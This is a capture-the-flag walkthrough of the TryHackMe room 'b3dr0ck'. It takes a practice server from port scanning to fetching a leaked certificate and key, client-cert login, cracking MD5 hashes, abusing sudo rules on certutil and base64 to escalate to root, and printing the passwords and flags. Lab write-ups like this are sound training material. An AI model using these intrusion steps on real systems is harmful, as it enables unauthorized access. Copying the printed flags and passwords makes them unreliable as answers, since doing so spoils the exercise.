# TryHackMe - b3dr0ck Writeup

## Room Information

* **Room Name:** b3dr0ck - Server trouble in Bedrock
* **Platform:** TryHackMe
* **Difficulty:** Easy
* **Author:** Durjoy Das
* **Objective:** Gain access to the Bedrock server, enumerate services, obtain user flags, and escalate privileges to root.

---

# Introduction

In this room we are presented with a server that appears to be misconfigured. The challenge revolves around discovering hidden services, abusing exposed certificates, obtaining credentials, and escalating privileges through misconfigured sudo permissions.

The attack path is:

1. Enumeration with Nmap
2. Discover hidden services
3. Obtain SSL certificate and private key
4. Authenticate to hidden service
5. Get Barney's password hash
6. SSH as Barney
7. Abuse `certutil`
8. Generate certificate for Fred
9. Obtain Fred's password
10. SSH as Fred
11. Read root password hint
12. Crack password hash
13. Become root
14. Capture root flag

---

# Step 1 - Initial Enumeration

First, perform a full TCP port scan.

```bash
nmap -sV -sC -Pn -p- 10.49.187.164 -oN scan_results
```

### Explanation

| Option | Description             |
| ------ | ----------------------- |
| `-sV`  | Detect service versions |
| `-sC`  | Run default NSE scripts |
| `-Pn`  | Skip host discovery     |
| `-p-`  | Scan all 65535 ports    |
| `-oN`  | Save output to a file   |

---

## Nmap Results

```text
22/tcp     open  ssh
80/tcp     open  http
4040/tcp   open  ssl
9009/tcp   open
54321/tcp  open  ssl
```

Interesting ports:

* 4040
* 9009
* 54321

---

# Step 2 - Inspect Website

Visit:

```text
https://10.49.187.164:4040
```

The page contains a message:

```text
Bamm Bamm tried to setup a sql database,
but I don't see it running.

Looks like it started something else...

He said it was from the toilet and OVER 9000!
```

### Hint Analysis

The clue:

```text
from the toilet
```

suggests:

```text
Toilet -> John
```

The clue:

```text
OVER 9000
```

suggests:

```text
Port 9009
```

Therefore port **9009** deserves further investigation.

---

# Step 3 - Connect to Port 9009

Use Netcat:

```bash
nc 10.49.187.164 9009
```

Banner appears:

```text
What are you looking for?
```

---

## Retrieve Certificate

Try:

```text
certificate
```

The server returns a certificate.

Save it:

```bash
nano certificate.cert
```

Paste certificate contents.

---

## Retrieve Private Key

Now request:

```text
key
```

The server returns a private key.

Save it:

```bash
nano privatekey
```

Paste the private key.

---

# Step 4 - Authenticate to Port 54321

Port 54321 requires SSL client authentication.

Connect using the certificate and key.

```bash
ncat --ssl \
--ssl-cert certificate.cert \
--ssl-key privatekey \
10.49.187.164 54321
```

### Explanation

| Option       | Description        |
| ------------ | ------------------ |
| `--ssl`      | Enable SSL         |
| `--ssl-cert` | Client certificate |
| `--ssl-key`  | Private key        |

---

## Successful Authentication

```text
Welcome: 'Barney Rubble' is authorized.
```

---

## Retrieve Password Hint

Run:

```text
passwd
```

Output:

```text
Password hint:
d1ad7c0a3805955a35eb260dab4180dd
(user = 'Barney Rubble')
```

---

# Step 5 - Crack Barney Password

The value looks like an MD5 hash.

Search it on:

```text
https://crackstation.net
```

Result:

```text
barney
```

Password:

```text
barney
```

---

# Step 6 - SSH as Barney

```bash
ssh barney@10.49.187.164
```

Password:

```text
barney
```

---

## User Flag

```bash
cat barney.txt
```

Flag:

```text
THM{f05780f08f0eb1de65023069d0e4c90c}
```

---

# Step 7 - Check Sudo Privileges

```bash
sudo -l
```

Output:

```text
(ALL : ALL) /usr/bin/certutil
```

Interesting.

---

# Step 8 - Enumerate Certificates

Run:

```bash
certutil ls
```

Output shows:

```text
fred.csr.pem
fred.certificate.pem
fred.clientKey.pem
```

---

# Step 9 - Abuse certutil

Run:

```bash
sudo certutil -a fred.csr.pem
```

The tool generates:

* New private key
* New certificate

for:

```text
fredcsrpem
```

Save both files locally.

```bash
nano fred_private_key
```

```bash
nano fred_certificate.cert
```

---

# Step 10 - Authenticate Again

Connect to port 54321 using the newly generated certificate.

```bash
ncat --ssl \
--ssl-cert fred_certificate.cert \
--ssl-key fred_private_key \
10.49.187.164 54321
```

---

Output:

```text
Welcome: 'fredcsrpem' is authorized.
```

Run:

```text
passwd
```

Result:

```text
Password hint:
YabbaDabbaD0000!
```

---

# Step 11 - SSH as Fred

```bash
ssh fred@10.49.187.164
```

Password:

```text
YabbaDabbaD0000!
```

---

## User Flag

```bash
cat fred.txt
```

Flag:

```text
THM{08da34e619da839b154521da7323559d}
```

---

# Step 12 - Check Sudo Rights

```bash
sudo -l
```

Output:

```text
(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

Interesting.

We can read encoded contents of `/root/pass.txt`.

---

# Step 13 - Read Root Password Hash

```bash
sudo /usr/bin/base64 /root/pass.txt
```

Output:

```text
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==
```

---

# Step 14 - Decode

Pipeline:

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```

Output:

```text
a00a12aad6b7c16bf07032bd05a31d56
```

This is another MD5 hash.

---

# Step 15 - Crack Root Hash

Search on CrackStation.

Result:

```text
flintstonesvitamins
```

Root password:

```text
flintstonesvitamins
```

---

# Step 16 - Become Root

```bash
su root
```

Password:

```text
flintstonesvitamins
```

---

Verify:

```bash
whoami
```

Output:

```text
root
```

---

# Step 17 - Root Flag

Locate flag:

```bash
find / -type f -name root.txt
```

Read:

```bash
cat /root/root.txt
```

Flag:

```text
THM{de4043c009214b56279982bf10a661b7}
```

---

# Flags Collected

## Barney Flag

```text
THM{f05780f08f0eb1de65023069d0e4c90c}
```

## Fred Flag

```text
THM{08da34e619da839b154521da7323559d}
```

## Root Flag

```text
THM{de4043c009214b56279982bf10a661b7}
```

---

# Key Learning Points

* Full port scans are important.
* Always investigate unusual ports.
* Read website hints carefully.
* Client certificates can be used for authentication.
* Misconfigured certificate management tools can lead to privilege escalation.
* Enumerating sudo permissions is critical.
* Encoded data is not encrypted data.
* Password hashes can sometimes be cracked using public databases.
* Multiple small misconfigurations can lead to complete system compromise.

---

# Attack Path Summary

```text
Nmap Scan
    ↓
Port 9009
    ↓
Retrieve Certificate + Key
    ↓
Authenticate to 54321
    ↓
Obtain Barney Hash
    ↓
SSH as Barney
    ↓
Abuse certutil
    ↓
Generate Fred Certificate
    ↓
Authenticate Again
    ↓
Obtain Fred Password
    ↓
SSH as Fred
    ↓
Read Encoded Root Password
    ↓
Decode + Crack Hash
    ↓
su root
    ↓
Root Flag
```

# Room Completed 🎉
